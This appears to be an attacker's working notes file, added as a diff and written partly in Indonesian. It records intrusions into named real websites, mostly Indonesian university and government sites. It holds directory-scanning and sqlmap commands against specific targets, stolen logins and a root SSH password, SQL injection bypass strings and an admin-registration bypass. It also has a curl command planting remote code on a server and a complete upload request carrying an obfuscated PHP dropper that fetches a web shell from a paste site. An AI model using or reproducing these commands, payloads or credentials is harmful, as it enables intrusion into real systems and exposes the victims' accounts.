@@ -1,0 +1,118 @@
+python dirsearch.py -u https://jurnal.ibik.ac.id/ -w files.txt
+
+python dirsearch.py -u https://stiksam.ac.id/ -w files.txt
+
+python dirsearch.py -u https://ojs.aaresearchindex.com/ -w files.txt
+
+python dirsearch.py -l smb2.txt -w files.txt
+
+python sqlmap.py -u https://siakad.uinbanten.ac.id/index.php/eadmin/login --data="username=1&password=1" -D u1n_lms --columns
+
+jiip.stkipyapisdompu.ac.id/jiip/index.php/JIIP/management/settings/access:rahmatillah:sunjosse
+https://jurnal.unipasby.ac.id/index.php/jurnal_budaya_nusantara/management/settings/access:nunung.nurjati@unipasby.ac.id:nunung1234
+' or 1=1 limit 1 — -+
+'=''or'
+:2087,:2082,:2083,:2222,/cpanel,/whm,/cp
+
+find /home/u604984660/domains/forum.consac.com/public_html/ -type f -newermt "2026-01-16" ! -newermt "2026-01-16"
+
+find /home/u604984660/domains/forum.consac.com/public_html/ -type f -name 0.PHP
+
+find /pa -type d -perm 0777
+
+find /home/barbar/public_html/public/ -type f -mtime 3
+
+https://cms-ncdds.analyticalx.org/
+
+curl -Ls https://pastee.dev/r/tKGAUSDk | tee -a /home/disdagkopukm/web2022/public/storage/ancuako.php
+
+backup/www/plugins/themes/material/vendor/mdb/src/scss/bootstrap/vendor
+ssh root@149.28.142.228
+user : root
+passwrod : ?9nQ7)F=D%QdwZq3
+1337Toku:)#$&:(
+susah@banget1337
+sergeykarjakin
+Hokiselalu99@
+Nyxgod88
+Nyxcyber!2025
+sergeykarjakin
+nullcyfm
+1337Toku:)#$&:('+'")_=_=23_+_+_@@
+username : kominfo
+password : 290802as
+./Livepyre.py -u https://dprd.bolmongkab.go.id/ -p 'cd /var/www/dprd.bolmongkab.go.id/public;ls' https://pastee.dev/r/wTIFbFGq -O tes.php'
+LARAVEL ADD ADMIN
+haxor1337@gmail.com
+KontolLodon12#
+
+burpsuite, ganti &email=...&password=... jan hapus hapus token
+=> &name=haxor1337&email=haxor1337%40gmail.com&password=KontolLodon12#&password_confirmation=KontolLodon12#
+
+
+ubah /login di header jadi
+=> /register
+ext bypass register admin
+.pHtMl
+.PhP
+.PhP5
+.sHtMl
+.PhP6
+
+file-manager/url?disk=topics&path=puk.php
+
+disnakertrans.sukabumikab.go.id/login:alpianindra3@gmail.com:3202110606940001
+
+http://diaf-assurance.com/
+
+hayalet.php
+articles.php
+wp-dir.php
+payment.php
+seo.php
+wp-clon.php
+input.php
+wp-inda.php
+js.php
+index.php
+GET /file-manager/tinymce UlFJSWtHjsFtW2c9Aby5odjwMVjhlmMb90FKwKeX
+ganti ke 
+POST /file-manager/upload
+
+taro di bwah host
+X-CSRF-TOKEN: 
+X-XSRF-TOKEN: 
+
+taro di bawha user-agent
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaOtStZPbAeho2Zow
+
+taro paling bawah
+
+------WebKitFormBoundaryaOtStZPbAeho2Zow
+Content-Disposition: form-data; name="disk"
+
+topics
+------WebKitFormBoundaryaOtStZPbAeho2Zow
+Content-Disposition: form-data; name="path"
+
+
+------WebKitFormBoundaryaOtStZPbAeho2Zow
+Content-Disposition: form-data; name="overwrite"
+
+1
+------WebKitFormBoundaryaOtStZPbAeho2Zow
+Content-Disposition: form-data; name="files[]"; filename="puk.php"
+Content-Type: application/octet-stream
+
+<?php
+
+
+
+$aaa="fi"."le";
+$awubdw="_get_";
+$wafeef="contents";
+$aazzz=$aaa.$awubdw.$wafeef;
+$aeeee="_put_";
+$avvvvvv=$aaa.$aeeee.$wafeef;
+$avvvvvv("draw.php",$aazzz("https://bpa.st/raw/GTDA"));
+------WebKitFormBoundaryaOtStZPbAeho2Zow--
